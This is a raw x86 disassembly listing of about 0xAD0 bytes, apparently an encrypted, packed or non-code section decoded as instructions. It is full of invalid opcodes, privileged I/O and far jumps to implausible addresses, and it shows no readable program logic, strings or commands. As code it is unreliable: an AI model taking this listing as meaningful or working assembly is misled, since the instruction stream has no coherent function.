  40ed98:	add    BYTE PTR [eax],al
  40ed9a:	mov    ebp,0xb552f46e
  40ed9f:	test   DWORD PTR [edx],0xc1e7e0b
  40eda5:	sbb    DWORD PTR [ebx],0xffffffae
  40eda8:	add    dh,BYTE PTR [ebx+edi*1+0x32]
  40edac:	cmp    al,0x0
  40edae:	adc    esi,DWORD PTR [ebp-0x151a3fd5]
  40edb4:	les    eax,FWORD PTR [edi]
  40edb6:	xor    bh,BYTE PTR ds:[ebx]
  40edb9:	jle    0x40eda5
  40edbb:	mov    eax,ds:0x11f33c83
  40edc0:	inc    ebx
  40edc1:	add    BYTE PTR [esi],bh
  40edc3:	pop    edi
  40edc4:	add    DWORD PTR [ebx],ebp
  40edc6:	jle    0x40ee41
  40edc8:	retf   
  40edc9:	rol    DWORD PTR [esi-0x4e],0x82
  40edcd:	aaa    
  40edce:	enter  0x3a66,0x8b
  40edd2:	jmp    0x40ed79
  40edd4:	dec    esp
  40edd5:	sbb    DWORD PTR [ecx+esi*4],0xb
  40edd9:	shr    BYTE PTR [ebx+0x3a7c83ac],cl
  40eddf:	mov    bl,0x6d
  40ede1:	add    al,0x55
  40ede3:	bnd jmp 0x40ee09
  40ede6:	sbb    DWORD PTR [edi+0x8],ebp
  40ede9:	mov    edi,DWORD PTR [ebx-0x4a]
  40edec:	std    
  40eded:	(bad)  
  40edee:	cmp    eax,0x1ec102b2
  40edf3:	pop    ebx
  40edf4:	jmp    0x40ee49
  40edf6:	out    0x82,al
  40edf8:	jo     0x40edf2
  40edfa:	lock or ah,BYTE PTR [edx+0x4e]
	...
  40ee26:	add    BYTE PTR [eax],al
  40ee28:	sbb    DWORD PTR ss:[ecx-0x64b09508],edi
  40ee2f:	jmp    0x40ee00
  40ee31:	(bad)  
  40ee32:	cmp    eax,0x200069f8
  40ee37:	lds    eax,FWORD PTR [ecx+0x5b]
  40ee3a:	add    bl,ch
  40ee3c:	shl    BYTE PTR ds:0x5332f8f5,0x93
  40ee43:	add    esp,DWORD PTR [ebx+ebx*2]
  40ee46:	push   ss
  40ee47:	push   cs
  40ee48:	sbb    al,0xfc
  40ee4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee4b:	add    edi,DWORD PTR [ebp+0x7e0cd896]
  40ee51:	test   BYTE PTR es:[edx+0x7829efa],cl
  40ee58:	mov    ebx,0x9652f915
  40ee5d:	out    0x70,eax
  40ee5f:	idiv   DWORD PTR [eax+0x30]
  40ee62:	jmp    0x38ebe8ef
  40ee67:	div    edx
  40ee69:	sahf   
  40ee6a:	int    0x11
  40ee6c:	in     al,dx
  40ee6d:	sti    
  40ee6e:	daa    
  40ee6f:	add    al,0xbd
  40ee71:	xchg   esi,eax
  40ee72:	in     al,dx
  40ee73:	or     bh,BYTE PTR [esi+0x25]
  40ee76:	cli    
  40ee77:	mov    BYTE PTR [edx],al
  40ee79:	stos   DWORD PTR es:[edi],eax
  40ee7a:	imul   edi,DWORD PTR [edx+edi*1+0x5b],0x1bc51b1d
  40ee82:	icebp  
  40ee83:	inc    ebx
  40ee84:	mov    es,WORD PTR [ebx-0x64d773e7]
  40ee8a:	popa   
  40ee8b:	fadd   QWORD PTR [eax]
	...
  40eeb5:	add    BYTE PTR [edx-0x560886e0],dh
  40eebb:	arpl   WORD PTR [edx],bx
  40eebd:	mul    DWORD PTR [ecx-0x547effa1]
  40eec3:	loop   0x40eec3
  40eec5:	outs   dx,BYTE PTR ds:[esi]
  40eec6:	xchg   esp,eax
  40eec7:	pop    ebx
  40eec8:	lea    ebp,[ebp+ebp*8-0x6c0b00d6]
  40eecf:	cmp    al,BYTE PTR [ecx-0x17]
  40eed2:	mov    esp,0x3ac3079e
  40eed7:	call   0x9e66:0x6fd14574
  40eede:	jp     0x40ef3b
  40eee0:	sub    DWORD PTR ds:0x92c2e63a,0xfffffff2
  40eee7:	pushf  
  40eee8:	pop    es
  40eee9:	jmp    0x1f2cd4fc
  40eeee:	das    
  40eeef:	call   FWORD PTR [si-0x65cb]
  40eef4:	adc    al,0x7c
  40eef6:	sbb    eax,0x7e6a001c
  40eefb:	bound  edx,QWORD PTR [eax-0x2]
  40eefe:	push   cs
  40eeff:	addr16 (bad) 
  40ef01:	jl     0x40ef38
  40ef03:	call   0x6a00:0x1c1d8014
  40ef0a:	mov    ecx,0x4a348b62
  40ef0f:	in     al,0x1
  40ef11:	xor    DWORD PTR [ebx-0x64],edi
  40ef14:	or     ebp,ecx
  40ef16:	push   cs
  40ef17:	out    0xeb,al
  40ef19:	push   0x0
	...
  40ef43:	add    BYTE PTR [ecx+0x4634fe82],bl
  40ef49:	or     ecx,0x65
  40ef4c:	push   eax
  40ef4d:	cdq    
  40ef4e:	or     ch,BYTE PTR [ecx-0x5436a132]
  40ef54:	dec    ebp
  40ef55:	pop    ebx
  40ef56:	call   DWORD PTR [esi+eax*2]
  40ef59:	cmp    DWORD PTR [edi+eax*2-0x56f566d0],0xffffff91
  40ef61:	pop    edi
  40ef62:	leave  
  40ef63:	add    ch,ah
  40ef65:	ins    DWORD PTR es:[edi],dx
  40ef66:	add    bh,bh
  40ef68:	or     ch,BYTE PTR [edx-0x1]
  40ef6b:	jne    0x40ef54
  40ef6d:	test   ebx,eax
  40ef6f:	std    
  40ef70:	nop
  40ef71:	xchg   ecx,eax
  40ef72:	or     eax,eax
  40ef74:	sbb    bl,BYTE PTR [edx+0x5df7c2c7]
  40ef7a:	push   0x1ef759
  40ef7f:	push   0x41317f
  40ef84:	outs   dx,DWORD PTR ds:[esi]
  40ef85:	dec    esi
  40ef86:	xchg   edx,eax
  40ef87:	call   DWORD PTR [eax]
  40ef89:	shl    BYTE PTR gs:[ebp-0x20],0x5
  40ef8e:	pop    ecx
  40ef8f:	pusha  
  40ef90:	xchg   esi,eax
  40ef91:	pop    ebp
  40ef92:	push   0x1e807a
  40ef97:	call   0x3edb4e
  40ef9c:	pushf  
  40ef9d:	popf   
  40ef9e:	or     eax,0x5f5a84
  40efa3:	add    BYTE PTR [edx],dl
  40efa5:	sbb    edi,esp
  40efa7:	push   eax
	...
  40efd0:	add    BYTE PTR [eax],al
  40efd2:	nop
  40efd3:	or     DWORD PTR [edi+edi*8],ecx
  40efd6:	push   0x36
  40efd8:	pusha  
  40efd9:	inc    ecx
  40efda:	xchg   edi,eax
  40efdb:	fadd   st(2),st
  40efdd:	or     BYTE PTR [ebp+ebx*4+0xd],ch
  40efe1:	test   edx,eax
  40efe3:	pop    ebp
  40efe4:	add    BYTE PTR [eax],al
  40efe6:	std    
  40efe7:	pop    esi
  40efe8:	lea    eax,[ebp-0x71]
  40efeb:	cs push 0xffffffff
  40efee:	out    dx,eax
  40efef:	mov    WORD PTR [esi+0x41],ds
  40eff2:	mov    ?,WORD PTR [bp+di-0x4]
  40eff6:	nop
  40eff7:	imul   esp,DWORD PTR [ecx+0x60],0xc4835f16
  40effe:	cmp    esp,DWORD PTR [eax+eax*8+0xf]
  40f002:	call   0xf382:0x3effffdf
  40f009:	je     0x40f031
  40f00b:	jmp    0x8304:0x439e650e
  40f012:	cli    
  40f013:	jle    0x40f094
  40f015:	mul    DWORD PTR [edx-0x6b17026a]
  40f01b:	add    DWORD PTR [edx],0x0
  40f01e:	retf   
  40f01f:	(bad)  
  40f020:	out    dx,al
  40f021:	dec    edi
  40f022:	fs xor bl,0x74
  40f026:	out    0x1a,al
  40f028:	adc    bh,bh
  40f02a:	loope  0x40f055
  40f02c:	or     eax,eax
  40f02e:	dec    ecx
  40f02f:	push   es
  40f030:	inc    ebp
  40f031:	add    DWORD PTR [esi],edi
  40f033:	cmp    BYTE PTR [edi+0x7c],0x0
	...
  40f05f:	add    dl,dl
  40f061:	add    BYTE PTR [ebx],0x84
  40f064:	jnp    0x40efe9
  40f066:	add    al,BYTE PTR [eax]
  40f068:	mov    esi,0xba0f027a
  40f06d:	mov    dh,0x1
  40f06f:	add    BYTE PTR [esi],bh
  40f071:	rol    BYTE PTR [edi+0x50c4aa54],cl
  40f077:	call   0xff35f9e6
  40f07c:	hlt    
  40f07d:	or     bh,BYTE PTR [edi]
  40f07f:	call   0xff30080d
  40f084:	or     ebx,DWORD PTR [edx+0x52]
  40f087:	call   0xff34f999
  40f08c:	jns    0x40f0cd
  40f08e:	hlt    
  40f08f:	jmp    FWORD PTR [ecx-0x7e]
  40f092:	add    al,bh
  40f094:	sti    
  40f095:	aad    0x2
  40f097:	add    BYTE PTR [esi],bh
  40f099:	cmp    BYTE PTR [edi+0x3c],0xcf
  40f09d:	and    DWORD PTR [ebx+0x0],eax
  40f0a0:	ds push edi
  40f0a2:	push   edx
  40f0a3:	push   0x4322d9
  40f0a8:	es pop ebx
  40f0aa:	arpl   WORD PTR [edx+0x3e],si
  40f0ad:	pop    ebx
  40f0ae:	cmp    DWORD PTR [ecx+eiz*4-0x6],ebp
  40f0b2:	daa    
  40f0b3:	add    al,0x21
  40f0b5:	push   cs
  40f0b6:	sub    ebx,0x3e90c9f
  40f0bc:	inc    ebp
  40f0bd:	fwait
  40f0be:	hlt    
  40f0bf:	sbb    edx,DWORD PTR [esi+0x430809]
	...
  40f0ed:	add    BYTE PTR [esi],bh
  40f0ef:	or     DWORD PTR [esi+0x72],0x3e
  40f0f3:	pop    ebx
  40f0f4:	mov    ecx,0xa7fa606b
  40f0f9:	add    ebp,ecx
  40f0fb:	or     eax,0xc7beb41
  40f100:	jmp    0xbcdc3608
  40f105:	dec    ebx
  40f106:	adc    ax,cx
  40f109:	inc    edx
  40f10a:	sub    DWORD PTR ds:[edx+0x72],0x3e
  40f10f:	pop    ebx
  40f110:	cdq    
  40f111:	imul   esi,DWORD PTR [eax],0xfffffffa
  40f114:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f115:	add    esi,DWORD PTR [ecx+0x57eb110d]
  40f11b:	or     al,0xe9
  40f11d:	add    edx,DWORD PTR [ebp+0xf366a48]
  40f123:	sti    
  40f124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f125:	add    edi,DWORD PTR [edi]
  40f127:	push   cs
  40f128:	jecxz  0x40f195
  40f12a:	or     edx,edi
  40f12c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f12d:	add    edx,DWORD PTR [esi+0x3e037837]
  40f133:	sub    edx,DWORD PTR [ecx+0x73]
  40f136:	fistp  WORD PTR [ecx]
  40f138:	jmp    0xc0c3e42f
  40f13d:	or     ebp,ebp
  40f13f:	pop    edx
  40f140:	jmp    0x41d3623
  40f145:	jne    0x40f125
  40f147:	sbb    ecx,ebp
  40f149:	add    eax,0x2005cd3
  40f14e:	jp     0x40f1b4
  40f150:	shl    BYTE PTR [eax+eax*1],0x0
	...
  40f17c:	pushf  
  40f17d:	call   0x1cb8ec6
  40f182:	add    DWORD PTR [esi-0x23186c59],ebx
  40f188:	das    
  40f189:	xchg   esi,eax
  40f18a:	dec    BYTE PTR [esi-0x6eb07069]
  40f190:	pop    ebp
  40f191:	cwde   
  40f192:	(bad)  
  40f193:	jle    0x40f120
  40f195:	pop    ds
  40f196:	lock fs ja 0x40f129
  40f19a:	dec    edi
  40f19b:	add    eax,DWORD PTR [eax-0x6a]
  40f19e:	je     0x40f201
  40f1a0:	adc    dh,BYTE PTR [edx-0x2]
  40f1a3:	pop    esi
  40f1a4:	in     eax,dx
  40f1a5:	xchg   ebp,eax
  40f1a6:	je     0x40f205
  40f1a8:	mov    al,BYTE PTR [ebx-0x6a32b3ec]
  40f1ae:	mov    BYTE PTR [ecx+esi*8+0x42517cd9],ch
  40f1b5:	sysenter 
  40f1b7:	push   0x4f
  40f1b9:	xchg   edi,edi
  40f1bb:	mov    ah,0x5f
  40f1bd:	add    eax,DWORD PTR [eax]
  40f1bf:	jmp    0x953fca60
  40f1c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1c5:	jle    0x40f194
  40f1c7:	imul   ebp,DWORD PTR [ebp+0x7594fe95],0xffffff95
  40f1ce:	je     0x40f1c1
  40f1d0:	jne    0x40f211
  40f1d2:	cmp    esi,0xffffff8c
  40f1d5:	xchg   ebp,eax
  40f1d6:	je     0x40f1d1
  40f1d8:	mov    WORD PTR [edi],cs
  40f1da:	or     BYTE PTR [ecx],al
  40f1dc:	dec    eax
  40f1dd:	(bad)  
  40f1df:	out    0x0,al
	...
  40f209:	add    BYTE PTR [edi+ecx*1-0x14],ch
  40f20d:	fsubrp st(6),st
  40f20f:	(bad)  
  40f210:	call   0xfed6aafb
  40f215:	into   
  40f216:	(bad)  
  40f217:	mov    ah,bh
  40f219:	add    BYTE PTR [ebx-0x7700021d],dl
  40f21f:	adc    ebp,esp
  40f221:	call   0x3ed5a1
  40f226:	call   0xc429da3d
  40f22b:	loop   0x40f22a
  40f22d:	dec    esi
  40f22f:	frndint 
  40f231:	dec    eax
  40f233:	mov    BYTE PTR [ebx-0x4],dh
  40f236:	enter  0x5d72,0x60
  40f23a:	pop    di
  40f23c:	add    esp,0x23
  40f23f:	mov    dl,0x7f
  40f241:	cld    
  40f242:	mov    BYTE PTR [ecx+0x5a17c2c7],cl
  40f248:	push   ebp
  40f249:	mov    ecx,DWORD PTR [ebx-0x77ff95d3]
  40f24f:	adc    ecx,DWORD PTR [eax]
  40f251:	call   0x3f0902
  40f256:	pop    esp
  40f257:	mov    ds:0xa4de851,al
  40f25c:	add    BYTE PTR [eax],al
  40f25e:	int3   
  40f25f:	cdq    
  40f260:	jb     0x40f27d
  40f262:	aam    0x9c
  40f264:	inc    esi
  40f265:	jmp    0x40f1fc
  40f267:	fnstenv [esi]
  40f269:	or     eax,0x388062d3
	...
  40f296:	add    BYTE PTR [eax],al
  40f298:	lods   eax,DWORD PTR ds:[esi]
  40f299:	adc    al,BYTE PTR ds:0xeb5997c6
  40f29f:	add    bh,BYTE PTR [ebx+eiz*2]
  40f2a2:	dec    eax
  40f2a3:	cmp    esp,DWORD PTR [ebp+ecx*1-0x16]
  40f2a7:	mov    edx,DWORD PTR [ebp+eiz*1-0x37]
  40f2ab:	ret    0x5993
  40f2ae:	push   ebp
  40f2af:	mov    edi,DWORD PTR [ebx-0x21]
  40f2b2:	ret    0x30b4
  40f2b5:	mov    WORD PTR [ebx+0xc],?
  40f2b8:	(bad)
  40f2bc:	lods   eax,DWORD PTR ds:[esi]
  40f2be:	cld    
  40f2bf:	mov    edi,0xc94f7ed3
  40f2c4:	jl     0x40f279
  40f2c6:	add    bh,bh
  40f2c8:	rol    DWORD PTR [edi-0x336db226],cl
  40f2ce:	lock or bh,dh
  40f2d1:	dec    esi
  40f2d2:	pop    es
  40f2d3:	pop    edi
  40f2d4:	pop    es
  40f2d5:	rcl    DWORD PTR [ebx],0x0
  40f2d8:	sub    DWORD PTR [eax+0x18],esi
  40f2db:	jmp    FWORD PTR [ebx+0x1554da92]
  40f2e1:	out    0xf0,al
  40f2e3:	mov    WORD PTR [ebx+0x12],?
  40f2e6:	push   esp
  40f2e7:	call   DWORD PTR [ebx-0x4b0e257a]
  40f2ed:	or     eax,0xb5fe0af1
  40f2f2:	xchg   BYTE PTR [edi],al
  40f2f4:	cmp    eax,0x73ff0282
  40f2f9:	ss icebp 
  40f2fb:	je     0x40f2fd
	...
  40f325:	add    dh,ah
  40f327:	sbb    bh,BYTE PTR [ebx-0x2da2671]
  40f32d:	mov    edi,0x1e00641
  40f332:	cmp    BYTE PTR ds:[ecx+0x44],0xd2
  40f337:	stc    
  40f338:	jmp    0x40f3b9
  40f33a:	jns    0x40f2be
  40f33c:	inc    DWORD PTR [ebx+0x28088]
  40f342:	adc    DWORD PTR [edx+0x57],ebp
  40f345:	jmp    DWORD PTR [ecx+0x6e447b6d]
  40f34b:	gs ja  0x40f31e
  40f34e:	es fs fs inc ecx
  40f352:	ds push 0x65
  40f355:	jo     0x40f395
  40f357:	adc    BYTE PTR [edx-0x1],0xf3
  40f35b:	jno    0x40f3b9
  40f35d:	jmp    0x2e56:0x4285ade
  40f364:	pop    ecx
  40f365:	add    al,0x3e
  40f367:	sub    edx,esi
  40f369:	jbe    0x40f3d9
  40f36b:	add    edi,DWORD PTR [edi-0x2ea5009d]
  40f371:	dec    eax
  40f372:	into   
  40f373:	pop    edx
  40f374:	jmp    0xa9a0dac6
  40f379:	ja     0x40f3c5
  40f37b:	pusha  
  40f37c:	fwait
  40f37d:	ja     0x40f3c5
  40f37f:	pusha  
  40f380:	mov    al,0x0
  40f382:	ret    
  40f383:	loopne 0x40f36f
  40f385:	add    edi,DWORD PTR [esi]
  40f387:	pusha  
  40f388:	mov    al,ds:0x76
	...
  40f3b1:	add    BYTE PTR [eax],al
  40f3b3:	add    BYTE PTR [edi-0x64],al
  40f3b6:	and    edi,DWORD PTR [eax+0x3e95b3e]
  40f3bc:	adc    eax,0xca46a65c
  40f3c1:	pop    edx
  40f3c2:	jmp    0xb9d831ca
  40f3c7:	ret    
  40f3c8:	mov    dh,0x93
  40f3ca:	gs lock call 0x396c8259
  40f3d1:	push   cs
  40f3d2:	jmp    0xe8c4769f
  40f3d7:	add    edi,DWORD PTR [esi]
  40f3d9:	pop    ebx
  40f3da:	imul   esi,DWORD PTR [eax],0x4b65643e
  40f3e0:	cmp    al,0x5b
  40f3e2:	jmp    0x2ef49a3f
  40f3e7:	lock mov al,0xe1
  40f3ea:	stos   DWORD PTR es:[edi],eax
  40f3eb:	mov    edi,0x31115bc
  40f3f0:	sub    edi,DWORD PTR [edx]
  40f3f2:	add    esi,0xf0e91a08
  40f3f8:	or     ah,BYTE PTR [edi+0x5b18e810]
  40f3fe:	jmp    0xa4b5ff
  40f403:	ins    BYTE PTR es:[edi],dx
  40f404:	dec    ebx
  40f405:	pop    ecx
  40f406:	add    cl,ch
  40f408:	xchg   BYTE PTR [esi],bl
  40f40a:	call   0x9c31f7
  40f40f:	shl    BYTE PTR [eax+0x59],1
  40f412:	add    cl,ch
  40f414:	mov    esp,0xe8e816
	...
  40f441:	add    dh,dl
  40f443:	arpl   WORD PTR [ecx+0x449c5644],cx
  40f449:	sar    DWORD PTR [ebx+ebx*2],1
  40f44c:	add    cl,ch
  40f44e:	sbb    bl,BYTE PTR [esi-0x21c21700]
  40f454:	jl     0x40f3e7
  40f456:	cmp    al,0x8
  40f458:	pshufw mm5,QWORD PTR [edi-0x5d33985],0x5d
  40f460:	add    cl,ch
  40f462:	cmp    eax,0x3de8ad84
  40f467:	pop    ebx
  40f468:	cmp    esp,0xffffffe5
  40f46b:	pop    ebp
  40f46c:	jne    0x40f454
  40f46e:	jp     0x40f47f
  40f470:	fsub   QWORD PTR [esi-0x16fc7c79]
  40f476:	cmp    eax,0x3b80e95b
  40f47b:	pop    ebx
  40f47c:	add    BYTE PTR [edx+0x4f],ch
  40f47f:	add    DWORD PTR [ebx],0xffffffd4
  40f482:	shl    bl,1
  40f484:	jl     0x40f4a7
  40f486:	add    DWORD PTR [eax],ebx
  40f488:	call   0x9c3271
  40f48d:	inc    eax
  40f48e:	(bad)  
  40f48f:	pop    ebx
  40f490:	add    cl,ch
  40f492:	mov    esp,0xa8ece80f
  40f497:	xlat   BYTE PTR ds:[ebx]
  40f498:	ins    BYTE PTR es:[edi],dx
  40f499:	call   0x94ca4fdb
  40f49e:	jno    0x40f47d
  40f4a0:	jl     0x40f4f7
  40f4a2:	cmp    al,BYTE PTR [edi]
  40f4a4:	or     DWORD PTR [eax],eax
	...
  40f4ce:	add    BYTE PTR [eax],al
  40f4d0:	pop    eax
  40f4d1:	and    al,0xe8
  40f4d3:	add    dl,BYTE PTR [edi+0x68eb005e]
  40f4d9:	cdq    
  40f4da:	inc    ebx
  40f4db:	call   0x415339
  40f4e0:	cwde   
  40f4e1:	and    eax,eax
  40f4e3:	add    BYTE PTR [edi+0x5e],dl
  40f4e6:	add    bh,al
  40f4e8:	sub    cl,bh
  40f4ea:	(bad)  
  40f4eb:	jmp    DWORD PTR [edi+0x5e]
  40f4ee:	mov    DWORD PTR [ebp-0x65],0x5700005e
  40f4f5:	cdq    
  40f4f6:	inc    ebx
  40f4f7:	mov    esp,0x5e27
  40f4fc:	fsub   DWORD PTR [edx]
  40f4fe:	mov    eax,0x5e1700
  40f503:	dec    DWORD PTR [edx-0x7d]
  40f506:	out    0x13,al
  40f508:	mov    cl,0x80
  40f50a:	std    
  40f50b:	mov    DWORD PTR [edx-0x69],ebx
  40f50e:	std    
  40f50f:	jne    0x40f4f4
  40f511:	mov    ch,0x6
  40f513:	inc    BYTE PTR [eax-0x60ba787f]
  40f519:	xor    BYTE PTR [ebx-0x2c],0xbf
  40f51d:	mov    bh,bl
  40f51f:	jmp    DWORD PTR [eax+0xf]
  40f522:	inc    esp
  40f523:	les    edx,FWORD PTR [ebx+ecx*2+0x71]
  40f527:	pusha  
  40f528:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f529:	pop    ebp
  40f52a:	add    BYTE PTR [ebp-0x6b],dh
  40f52d:	xor    eax,0x5d966167
  40f532:	call   0x40f5be
	...
  40f55b:	add    BYTE PTR [eax],al
  40f55d:	add    cl,dh
  40f55f:	pop    ebp
  40f560:	add    BYTE PTR [eax+0x7f],dl
  40f563:	clc    
  40f564:	pusha  
  40f565:	inc    ecx
  40f566:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f567:	xor    BYTE PTR [ebx-0x40],0x4f
  40f56b:	jno    0x40f5dd
  40f56d:	add    BYTE PTR [edi+0x3e74be94],dl
  40f573:	mov    WORD PTR [edx+0x6e],ds
  40f576:	pop    ds
  40f577:	ret    
  40f578:	add    ch,al
  40f57a:	adc    eax,0xee0002ea
  40f57f:	jmp    0x40f5dd
  40f581:	popa   
  40f582:	inc    DWORD PTR [ebx+0x5b7e74ed]
  40f588:	adc    dh,BYTE PTR [eax+0x3e]
  40f58b:	test   bh,dh
  40f58d:	mov    edi,0x765c70ea
  40f592:	fild   WORD PTR [edx+0x4]
  40f595:	call   0x45479b
  40f59a:	out    dx,al
  40f59b:	sub    esi,DWORD PTR [esi+0x61]
  40f59e:	inc    DWORD PTR [ebx-0x65018b15]
  40f5a4:	hlt    
  40f5a5:	outs   dx,BYTE PTR ds:[esi]
  40f5a6:	ds adc bh,0x24
  40f5aa:	mov    ebp,0x7f607177
  40f5af:	add    BYTE PTR [ecx],0x75
  40f5b2:	xor    al,0x5a
  40f5b4:	ins    DWORD PTR es:[edi],dx
  40f5b5:	popa   
  40f5b6:	jg     0x40f53a
  40f5b8:	fisubr DWORD PTR [ebx]
  40f5ba:	cwde   
  40f5bb:	add    BYTE PTR [edx],0x50
  40f5be:	xchg   esi,eax
  40f5bf:	xchg   ecx,eax
  40f5c0:	popa   
  40f5c1:	inc    ecx
	...
  40f5ea:	add    BYTE PTR [eax],al
  40f5ec:	or     DWORD PTR ds:[edi-0x40],esi
  40f5f0:	out    0xe6,al
  40f5f2:	pop    esp
  40f5f3:	add    BYTE PTR [esi],bh
  40f5f5:	sub    eax,0x8dfe2b02
  40f5fa:	ret    0x5c74
  40f5fd:	sub    DWORD PTR [edi-0x38],esi
  40f600:	out    0xb0,al
  40f602:	pop    esp
  40f603:	add    BYTE PTR [esi],bh
  40f605:	bnd jmp 0x40f67c
  40f608:	imul   BYTE PTR [edx]
  40f60a:	stc    
  40f60b:	stc    
  40f60c:	mov    ecx,0xf2447b49
  40f611:	inc    ecx
  40f612:	ja     0x40f5d8
  40f614:	xchg   esi,eax
  40f615:	pop    ebx
  40f616:	and    ebx,DWORD PTR [edi+0x3e]
  40f619:	pop    ebx
  40f61a:	mov    ecx,0x9712ec
  40f61f:	cmc    
  40f620:	xchg   esi,eax
  40f621:	nop
  40f622:	or     eax,0x69d3027b
  40f627:	outs   dx,DWORD PTR ds:[esi]
  40f628:	jle    0x40f685
  40f62a:	jne    0x40f663
  40f62c:	mov    ebp,0xea04310e
  40f631:	inc    eax
  40f632:	add    DWORD PTR [ebx],0xeca6803e
  40f638:	jmp    0xd58f:0xd8b3d162
  40f63f:	in     al,dx
  40f640:	retf   0xcd9a
  40f643:	jbe    0x40f67b
  40f645:	sub    ebp,0xffffff83
  40f648:	inc    eax
  40f649:	nop
  40f64a:	mov    ebp,0x3b8ffa76
  40f64f:	cld    
	...
  40f678:	add    BYTE PTR [eax],al
  40f67a:	sbb    DWORD PTR [edi-0x6fd712d3],ecx
  40f680:	sbb    ebp,DWORD PTR [eax+eiz*1+0xedbf106]
  40f687:	adc    BYTE PTR [esi-0x56f9ef14],dl
  40f68d:	fcomi  st,st(3)
  40f68f:	fadd   QWORD PTR [ebp-0x4ef9ff14]
  40f695:	fisttp DWORD PTR [ebx]
  40f697:	fnsave [ebp-0x14]
  40f69a:	lock add eax,0xdd03dba5
  40f6a0:	gs in  al,dx
  40f6a2:	loopne 0x40f6a9
  40f6a4:	popf   
  40f6a5:	fistp  DWORD PTR [ebx-0x2f13aa24]
  40f6ab:	add    eax,0xdc93db91
  40f6b0:	inc    ebp
  40f6b1:	in     al,dx
  40f6b2:	aam    0x5d
  40f6b4:	push   0x6e
  40f6b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6b7:	pop    eax
  40f6b8:	add    BYTE PTR [edx+edi*1+0x3f414498],bh
  40f6bf:	pop    ebx
  40f6c0:	add    cl,ch
  40f6c2:	mov    esi,0x11e9e80e
  40f6c7:	dec    ebx
  40f6c8:	push   0x1a522c
  40f6cd:	push   cs
  40f6ce:	adc    BYTE PTR [edi+0x5ae011e7],bl
  40f6d4:	add    dl,dh
  40f6d6:	jge    0x40f6de
  40f6d8:	pop    es
  40f6d9:	cs clc 
  40f6db:	add    BYTE PTR [eax],0xe9
	...
  40f706:	add    BYTE PTR [eax],al
  40f708:	cmp    eax,0xdb4a685b
  40f70d:	sbb    DWORD PTR [eax],eax
  40f70f:	fmulp  st(7),st
  40f711:	sahf   
  40f712:	out    0xb9,eax
  40f714:	neg    DWORD PTR [edx+0x0]
  40f717:	loop   0x40f796
  40f719:	push   es
  40f71a:	pop    es
  40f71b:	scas   al,BYTE PTR es:[edi]
  40f71c:	inc    DWORD PTR [edx+0x5b3de901]
  40f722:	(bad)  
  40f723:	cmp    al,0xf6
  40f725:	jbe    0x40f78f
  40f727:	imul   edx,DWORD PTR ds:0xfddafb8e,0xffffffd3
  40f72e:	(bad)  
  40f72f:	sahf   
  40f730:	and    eax,0x6247f18e
  40f735:	push   esi
  40f736:	pcmpgtb mm6,QWORD PTR [ebp+0x1586fe8f]
  40f73d:	or     al,dl
  40f73f:	xchg   ecx,eax
  40f740:	xor    eax,0xe576fed9
  40f745:	pop    es
  40f746:	in     al,dx
  40f747:	cmp    DWORD PTR [ebp-0x27],0x176766fe
  40f74e:	lock mov ecx,0x568808f5
  40f754:	in     eax,0x76
  40f756:	jmp    0x40f7a9
  40f758:	aad    0x8d
  40f75a:	pop    esi
  40f75b:	add    BYTE PTR [esi],cl
  40f75d:	xchg   ebp,eax
  40f75e:	push   cs
  40f75f:	add    dl,dl
  40f761:	or     eax,0xcb6381eb
  40f766:	cld    
  40f767:	call   FWORD PTR [eax-0x66]
  40f76a:	cmp    DWORD PTR [eax+0x0],0x0
	...
  40f795:	add    BYTE PTR [ecx-0x7e],bl
  40f798:	std    
  40f799:	add    BYTE PTR [edi-0x1d74ffa6],ah
  40f79f:	pop    esi
  40f7a0:	or     eax,eax
  40f7a2:	mov    bl,0x5b
  40f7a4:	cmp    BYTE PTR [eax],0x97
  40f7a7:	or     eax,DWORD PTR ds:0x58a3e9
  40f7ad:	add    BYTE PTR [eax+0xb],ch
  40f7b0:	adc    al,0xe8
  40f7b2:	iret   
  40f7b3:	adc    edi,esi
  40f7b5:	jmp    FWORD PTR [edx+ebx*4+0x73]
  40f7b9:	pxor   mm1,mm4
  40f7bc:	dec    ebp
  40f7bd:	inc    ecx
  40f7be:	xor    DWORD PTR [bp+di+0x14],0xff83ec7f
  40f7c6:	js     0x40f775
  40f7c8:	or     ebp,DWORD PTR [eax-0x18]
  40f7cb:	push   eax
  40f7cc:	inc    ecx
  40f7cd:	add    al,ch
  40f7cf:	or     dl,BYTE PTR [eax+ebp*8]
  40f7d2:	mov    al,ds:0xaefffddb
  40f7d7:	(bad)  [esi+0x6680b8fe]
  40f7dd:	ds es pop edx
  40f7e0:	add    BYTE PTR [ebp-0x3675e],cl
  40f7e6:	mov    eax,0x66ffe829
  40f7eb:	cmp    ebp,0xfc98628d
  40f7f1:	call   FWORD PTR [eax+0x2a]
  40f7f4:	push   DWORD PTR [ebp-0x27c61]
	...
  40f822:	add    BYTE PTR [eax],al
  40f824:	outs   dx,DWORD PTR ds:[esi]
  40f825:	inc    edi
  40f826:	ins    DWORD PTR es:[edi],dx
  40f827:	add    BYTE PTR [esi],bh
  40f829:	test   BYTE PTR [ebx-0x7c],bh
  40f82c:	mov    bl,BYTE PTR ds:0x857efeea
  40f832:	jle    0x40f819
  40f834:	aas    
  40f835:	test   BYTE PTR [edx],al
  40f837:	(bad)  
  40f838:	retf   
  40f839:	inc    ecx
  40f83a:	jmp    0x585a23d
  40f83f:	adc    BYTE PTR [esi],bh
  40f841:	test   BYTE PTR [edx],al
  40f843:	cmpunordps xmm0,XMMWORD PTR [eax]
  40f847:	add    BYTE PTR [esi],bh
  40f849:	test   DWORD PTR [esp+ebp*1-0x12],0xff4ebfdb
  40f851:	sbb    edx,0x9
  40f854:	jmp    0x40f7d9
  40f856:	add    cl,BYTE PTR [ebx]
  40f858:	jle    0x40f868
  40f85a:	add    cl,ch
  40f85c:	mov    BYTE PTR [edx+0xeb30002],0xc6
  40f863:	std    
  40f864:	pop    ecx
  40f865:	lods   al,BYTE PTR ds:[esi]
  40f866:	jbe    0x40f8a9
  40f868:	and    dl,BYTE PTR [esp+ebx*2-0x39]
  40f86c:	stc    
